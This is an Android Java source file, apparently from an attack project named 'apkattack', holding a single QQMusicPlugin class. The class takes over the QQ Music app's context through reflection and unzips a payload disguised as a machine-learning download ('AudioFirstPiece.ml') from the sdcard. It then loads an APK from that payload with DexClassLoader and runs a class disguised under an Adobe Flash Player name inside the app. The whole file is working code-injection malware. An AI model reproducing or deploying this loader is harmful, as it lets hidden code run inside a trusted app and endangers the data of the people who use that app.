package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

@SuppressLint("SdCardPath") public class QQMusicPlugin {

	public static void QQMusicPluginEntry(){
		String Tag = "QQMusicPluginEntry";
		try {
			Log.e(Tag,"start");
			
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/" + context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }

			String apptpath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apptpath + "fuck_qqmusic/";
	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String cfgfn = "ark.dat";
	    	String apkfn = "";
	    	boolean apkexist = false;
	    	boolean cfgexit = false;
	    	File assetspathFile = new File(unzippath + "assets/");
	    	if (assetspathFile.exists() == true) {
				File assetsFiles[] = assetspathFile.listFiles();
				if (assetsFiles != null && assetsFiles.length > 0) {
					for(int i = 0;i < assetsFiles.length; i ++)
					{
						String subfn = assetsFiles[i].getName();
						if(subfn.endsWith(".apk") == true){
							apkexist = true;
							apkfn = subfn;
						}else if (subfn.equals(cfgfn) == true) {
							cfgexit = true;
						}
					}
				}
			}else{
				boolean ret = assetspathFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + assetspathFile.getName());
					return;
				}
			}
	    	
	    	
	    	if (apkexist == false || cfgexit == false ) {
		    	
		    	String pluginPath = "/sdcard/qqmusic/machine-learning-download/";
		    	String ppapkfn = "AudioFirstPiece.ml";
		    	
		    	File fileplugin = new File(pluginPath + ppapkfn);
		    	if (fileplugin.exists() == false) {
		    		Log.e(Tag,"not found qqmusic sdcard plugin source zip file");
		    		return;
				}

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginPath + ppapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
	    	

			File []assetsfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < assetsfiles.length; i++) {
				String tmpfn = assetsfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}

	    	String appcachepath = context.getCacheDir() + "/";
	    	
	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

			Class<?> cls = dexcl.loadClass(dexclassname);
		    Object obj = cls.newInstance();

		    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
		    method.invoke(obj,context,unzippath + "assets/");
		    
		    Log.e(Tag, "qqmusic load apk success");
		} catch (Exception ex) {
			ex.printStackTrace();
			Log.e(Tag, "qqmusic load apk exception");
		}
	}

}
